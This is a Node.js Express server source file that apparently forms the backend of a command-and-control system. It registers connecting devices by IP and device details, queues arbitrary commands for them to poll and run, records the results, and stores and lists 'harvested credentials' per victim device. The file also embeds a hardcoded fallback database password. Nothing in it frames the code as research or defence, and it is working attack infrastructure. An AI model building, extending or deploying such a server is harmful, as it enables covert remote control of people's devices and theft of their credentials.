const express = require('express');
const mysql = require('mysql2');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'dist')));

// Database connection
const db = mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || 'ismail211084',
    database: process.env.DB_NAME || 'access_manager'
});

db.connect((err) => {
    if (err) {
        console.error('Database connection failed: ', err);
        return;
    }
    console.log('Connected to MySQL database');

    // Create tables if they don't exist
    const createConnectionsTable = `
    CREATE TABLE IF NOT EXISTS connections (
      id INT AUTO_INCREMENT PRIMARY KEY,
      ip VARCHAR(50) NOT NULL,
      user_agent TEXT NOT NULL,
      device_info TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      status VARCHAR(20) DEFAULT 'active'
    )
  `;

    const createCommandsTable = `
    CREATE TABLE IF NOT EXISTS commands (
      id INT AUTO_INCREMENT PRIMARY KEY,
      connection_id INT NOT NULL,
      command TEXT NOT NULL,
      status VARCHAR(20) DEFAULT 'pending',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      executed_at DATETIME,
      result TEXT,
      FOREIGN KEY (connection_id) REFERENCES connections(id)
    )
  `;

    db.query(createConnectionsTable, (err) => {
        if (err) console.error('Error creating connections table:', err);
        else console.log('Connections table is ready');

        db.query(createCommandsTable, (err) => {
            if (err) console.error('Error creating commands table:', err);
            else console.log('Commands table is ready');
        });
    });
});

// API Routes
app.post('/api/connect', (req, res) => {
    const { userAgent, deviceInfo } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const query = 'INSERT INTO connections (ip, user_agent, device_info) VALUES (?, ?, ?)';
    db.query(query, [ip, userAgent, JSON.stringify(deviceInfo)], (err, result) => {
        if (err) {
            console.error('Error saving connection:', err);
            return res.status(500).json({ error: 'Failed to establish connection' });
        }

        res.json({
            success: true,
            connectionId: result.insertId,
            message: 'Connection established successfully'
        });
    });
});

app.get('/api/connections', (req, res) => {
    db.query('SELECT * FROM connections ORDER BY timestamp DESC', (err, results) => {
        if (err) {
            console.error('Error fetching connections:', err);
            return res.status(500).json({ error: 'Failed to retrieve connections' });
        }

        res.json(results);
    });
});

// Add a command to be executed on a connected device
app.post('/api/command/:connectionId', (req, res) => {
    const { connectionId } = req.params;
    const { command } = req.body;

    if (!command) {
        return res.status(400).json({ error: 'Command is required' });
    }

    // Check if connection exists and is active
    db.query(
        'SELECT * FROM connections WHERE id = ? AND status = "active"',
        [connectionId],
        (err, results) => {
            if (err) {
                console.error('Error checking connection:', err);
                return res.status(500).json({ error: 'Database error' });
            }

            if (results.length === 0) {
                return res.status(404).json({ error: 'Active connection not found' });
            }

            // Insert command
            db.query(
                'INSERT INTO commands (connection_id, command) VALUES (?, ?)',
                [connectionId, command],
                (err, result) => {
                    if (err) {
                        console.error('Error saving command:', err);
                        return res.status(500).json({ error: 'Failed to save command' });
                    }

                    res.json({
                        success: true,
                        commandId: result.insertId,
                        message: 'Command queued for execution'
                    });
                }
            );
        }
    );
});

// Get commands for a specific connection (for the client to poll)
app.get('/api/commands/:connectionId', (req, res) => {
    const { connectionId } = req.params;

    db.query(
        'SELECT * FROM commands WHERE connection_id = ? AND status = "pending" ORDER BY created_at ASC',
        [connectionId],
        (err, results) => {
            if (err) {
                console.error('Error fetching commands:', err);
                return res.status(500).json({ error: 'Failed to retrieve commands' });
            }

            res.json(results);
        }
    );
});

// Update command status after execution
app.post('/api/command/:commandId/update', (req, res) => {
    const { commandId } = req.params;
    const { status, result } = req.body;

    db.query(
        'UPDATE commands SET status = ?, result = ?, executed_at = NOW() WHERE id = ?',
        [status, JSON.stringify(result), commandId],
        (err) => {
            if (err) {
                console.error('Error updating command status:', err);
                return res.status(500).json({ error: 'Failed to update command status' });
            }

            res.json({
                success: true,
                message: 'Command status updated'
            });
        }
    );
});

// Store harvested credentials
app.post('/api/credentials/:connectionId', (req, res) => {
    const { connectionId } = req.params;
    const { type, data } = req.body;

    if (!data) {
        return res.status(400).json({ error: 'Credential data is required' });
    }

    // Check if connection exists
    db.query(
        'SELECT * FROM connections WHERE id = ?',
        [connectionId],
        (err, results) => {
            if (err) {
                console.error('Error checking connection:', err);
                return res.status(500).json({ error: 'Database error' });
            }

            if (results.length === 0) {
                return res.status(404).json({ error: 'Connection not found' });
            }

            // Create credentials table if it doesn't exist
            const createCredentialsTable = `
        CREATE TABLE IF NOT EXISTS credentials (
          id INT AUTO_INCREMENT PRIMARY KEY,
          connection_id INT NOT NULL,
          type VARCHAR(50) NOT NULL,
          data TEXT NOT NULL,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
          FOREIGN KEY (connection_id) REFERENCES connections(id)
        )
      `;

            db.query(createCredentialsTable, (err) => {
                if (err) {
                    console.error('Error creating credentials table:', err);
                    return res.status(500).json({ error: 'Database error' });
                }

                // Insert the credentials
                db.query(
                    'INSERT INTO credentials (connection_id, type, data) VALUES (?, ?, ?)',
                    [connectionId, type, JSON.stringify(data)],
                    (err, result) => {
                        if (err) {
                            console.error('Error saving credentials:', err);
                            return res.status(500).json({ error: 'Failed to save credentials' });
                        }

                        res.json({
                            success: true,
                            credentialId: result.insertId
                        });
                    }
                );
            });
        }
    );
});

// Get harvested credentials
app.get('/api/credentials', (req, res) => {
    // Create credentials table if it doesn't exist (just in case)
    const createCredentialsTable = `
    CREATE TABLE IF NOT EXISTS credentials (
      id INT AUTO_INCREMENT PRIMARY KEY,
      connection_id INT NOT NULL,
      type VARCHAR(50) NOT NULL,
      data TEXT NOT NULL,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (connection_id) REFERENCES connections(id)
    )
  `;

    db.query(createCredentialsTable, (err) => {
        if (err) {
            console.error('Error creating credentials table:', err);
            return res.status(500).json({ error: 'Database error' });
        }

        // Fetch all credentials with connection info
        db.query(
            `SELECT c.*, conn.ip as connection_ip 
       FROM credentials c
       JOIN connections conn ON c.connection_id = conn.id
       ORDER BY c.timestamp DESC`,
            (err, results) => {
                if (err) {
                    console.error('Error fetching credentials:', err);
                    return res.status(500).json({ error: 'Failed to retrieve credentials' });
                }

                // Parse the data field for each credential
                const formattedResults = results.map(row => ({
                    ...row,
                    data: JSON.parse(row.data)
                }));

                res.json(formattedResults);
            }
        );
    });
});

// Serve React app for any other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
}); 